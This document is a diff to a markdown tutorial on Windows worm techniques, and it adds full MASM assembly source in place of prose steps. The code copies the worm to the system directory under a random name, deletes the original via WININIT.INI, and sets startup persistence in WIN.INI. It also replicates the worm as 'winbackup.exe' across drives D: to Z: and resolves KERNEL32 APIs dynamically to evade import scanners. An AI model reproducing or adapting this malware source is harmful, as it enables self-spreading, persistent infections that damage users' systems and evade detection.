@@ -26,73 +26,260 @@ Many worms use static filenames like:
 That makes them easy to find and delete.  
 So instead, I randomize the filename at each execution using API calls and `GetTickCount()`.
 
-### 📄 Steps:
+### 📄 Technique:
 
-1. **Create a random name in `%windir%` or `%sysdir%`:**
-   - Use `GetSystemDirectoryA` to build a path
-   - Generate a random filename (e.g., `jwvv.exe`, `abgqlbg.exe`, `slb.exe`)
-   - Avoid repeating characters by calling `Sleep()` between loops
+```asm
+.586p
+.model flat
+.code
 
-2. **Schedule deletion of the original worm using `WININIT.INI`:**
+JUMPS
 
+api macro a
+extrn a:proc
+call a
+endm
+
+include Useful.inc
+
+start_worm:
+    push    50
+    mov esi,offset orig_worm
+    push    esi
+    push    0
+    api GetModuleFileNameA
+
+    mov edi,offset copy_worm
+    push    edi
+    push    50
+    push    edi
+    api GetSystemDirectoryA
+    add edi,eax
+    mov al,"\"
+    stosb
+    api GetTickCount
+    push    9
+    pop ecx
+    xor edx,edx
+    div ecx
+    inc edx
+    mov ecx,edx
+copy_g:
+    push    ecx
+    api GetTickCount
+    push    'z'-'a'
+    pop ecx
+    xor edx,edx
+    div ecx
+    xchg    eax,edx
+    add al,'a'
+    stosb
+    api GetTickCount
+    push    100
+    pop ecx
+    xor edx,edx
+    div ecx
+    push    edx
+    api Sleep
+    pop ecx
+    loop    copy_g
+    mov eax,"exe."
+    stosd
+    pop edi
+
+    push    50
+    push    offset wininit
+    api GetWindowsDirectoryA
+    @pushsz "\WININIT.INI"
+    push    offset wininit
+    api lstrcat
+    push    offset wininit
+    push    esi
+    @pushsz "NUL"
+    @pushsz "rename"
+    api WritePrivateProfileStringA
+
+copy_w:
+    push    0
+    push    edi
+    push    esi
+    api CopyFileA
+
+run_w:
+    push    edi
+    @pushsz "RUN"
+    @pushsz "WINDOWS"
+    api WriteProfileStringA
+
+end_worm:
+    push    0
+    api ExitProcess
+
+.data
+copy_worm   db 50 dup (0)
+orig_worm   db 50 dup (0)
+wininit     db 50 dup (0)
+
+end start_worm
+end
 ```
-[rename]
-NUL=original_name
-```
-
-3. **Copy the worm to its new location** using `CopyFileA`
-
-4. **Register it to run on startup** via the `RUN` key in `WIN.INI`
-
-➡️ Full source code provided below (MASM format)
 
 ---
 
 ## 💾 II. Spread a Worm into Different Drives
 
-One copy is good. Many copies are better.  
-This technique replicates the worm to multiple drives (D: to Z:), skipping floppy drives (A: and B:).
+Replicate the worm across multiple drives to ensure persistence.
 
-### 🧰 Code Strategy:
-- Retrieve the worm’s current path with `GetModuleFileNameA`
-- Loop through all drives and copy the worm as `winbackup.exe`
-- Use `SetCurrentDirectoryA` to switch directories
+```asm
+.586p
+.model flat
+.code
 
-➡️ Full MASM source included with all drive letters listed explicitly.
+JUMPS
+
+api macro a
+extrn a:proc
+call a
+endm
+
+include Useful.inc
+
+start_worm:
+    push    50
+    mov esi,offset orig_worm
+    push    esi
+    push    0
+    api GetModuleFileNameA
+
+spread_system:
+    call    @lect
+    db  "D:\",0
+    db  "E:\",0
+    db  "F:\",0
+    db  "G:\",0
+    db  "H:\",0
+    db  "I:\",0
+    db  "J:\",0
+    db  "K:\",0
+    db  "L:\",0
+    db  "M:\",0
+    db  "N:\",0
+    db  "O:\",0
+    db  "P:\",0
+    db  "Q:\",0
+    db  "R:\",0
+    db  "S:\",0
+    db  "T:\",0
+    db  "U:\",0
+    db  "V:\",0
+    db  "W:\",0
+    db  "X:\",0
+    db  "Y:\",0
+    db  "Z:\",0
+@lect:
+    pop esi
+    push    23
+    pop ecx
+loop_lect:
+    push    ecx
+    push    esi
+    api SetCurrentDirectoryA
+    push    0
+    @pushsz "winbackup.exe"
+    push    offset orig_worm
+    api CopyFileA
+    @endsz
+    pop ecx
+    loop    loop_lect
+
+end_spread_system:
+end_worm:
+    push    0
+    api ExitProcess
+
+.data
+orig_worm   db 50 dup (0)
+lect        db 50 dup (0)
+
+end start_worm
+end
+```
 
 ---
 
 ## 🧠 III. Extract API from `KERNEL32.DLL`
 
-Debuggers like W32DASM reveal which APIs a binary uses.  
-This makes it easier to detect malicious behavior like file manipulation.
+To avoid detection by import scanners, resolve API addresses dynamically.
 
-### 🕵️ To avoid detection:
-Instead of using standard imports, dynamically resolve function addresses at runtime.
+```asm
+.586p
+.model flat
+.code
 
-#### 📉 Traditional view in debugger:
+JUMPS
+
+api macro a
+extrn a:proc
+call a
+endm
+
+include Useful.inc
+
+start_worm:
+    @pushsz "KERNEL32.DLL"
+    api GetModuleHandleA
+    xchg    eax,ebx
+
+kern    macro x
+    push    offset sz&x
+    push    ebx
+    api GetProcAddress
+    mov _ptk&x,eax
+endm
+
+    kern    CloseHandle
+    kern    CreateFileA
+    kern    WriteFile
+
+prep_spread_worm:
+    push    0
+    push    80h
+    push    2
+    push    0
+    push    1
+    push    40000000h
+    @pushsz "C:\KernApi.txt"
+    call    _ptkCreateFileA
+    xchg    eax,ebx
+    push    0
+    push    offset octets
+    push    e_txt - s_txt
+    push    offset s_txt
+    push    ebx
+    call    _ptkWriteFile
+    push    ebx
+    call    _ptkCloseHandle
+
+.data
+octets  dd ?
+
+szCloseHandle       db "CloseHandle",0
+szCreateFileA       db "CreateFileA",0
+szWriteFile         db "WriteFile",0
+
+_ptkCloseHandle     dd ?
+_ptkCreateFileA     dd ?
+_ptkWriteFile       dd ?
+
+s_txt:  db 'Text file create with',13,10
+        db 'APIs extract from',13,10
+        db 'KERNEL32.DLL library',13,10,13,10
+        db 9,'PetiK',13,10
+e_txt:
+
+end start_worm
+end
 ```
-KERNEL32.CloseHandle
-KERNEL32.CreateFileA
-KERNEL32.WriteFile
-```
-
-#### ✅ After hiding:
-Only these are shown:
-```
-KERNEL32.GetModuleHandleA
-KERNEL32.GetProcAddress
-```
-
-### 🧪 Code Flow:
-1. Get handle to `KERNEL32.DLL`
-2. Use `GetProcAddress` to resolve API pointers:
-   - `CloseHandle`
-   - `CreateFileA`
-   - `WriteFile`
-3. Call them manually
-
-➡️ MASM source provided to write a message into `C:\KernApi.txt` using dynamic API calls.
 
 ---
 
